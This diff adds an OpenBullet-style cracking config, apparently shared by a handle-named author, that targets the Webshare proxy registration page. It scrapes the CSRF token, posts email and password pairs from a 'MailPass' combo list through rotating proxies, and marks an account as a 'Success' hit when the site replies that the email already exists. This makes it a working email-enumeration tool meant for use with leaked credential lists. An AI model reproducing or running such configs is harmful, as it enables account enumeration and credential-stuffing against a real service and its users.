@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Webshare VM",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T22:31:51.9657288+04:00",
+  "AdditionalInfo": "Config built for Bins Man Mulkata By Keshave Caussy ♥ - Make Love, Not WAR ♥",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_TK REQUEST GET "https://proxy.webshare.io/register/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" CSS "[name=csrfmiddlewaretoken]" "value" -> VAR "TK" 
+
+#AA PARSE "<SOURCE>" CSS "[name=a]" "value" -> VAR "AA" 
+
+REQUEST POST "https://proxy.webshare.io/register/" 
+  CONTENT "csrfmiddlewaretoken=<TK>&next=&a=<AA>&email=<USER>&password1=<PASS>&g-recaptcha-response=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 705" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://proxy.webshare.io" 
+  HEADER "referer: https://proxy.webshare.io/register/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "A user with that email already exists." 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "302" 
+    KEY "Welcome to Webshare" 
+    KEY "\"user_token\": \"" 
+
+#AUTHOR FUNCTION Constant "Keshave Caussy" -> CAP "Config By " 
+
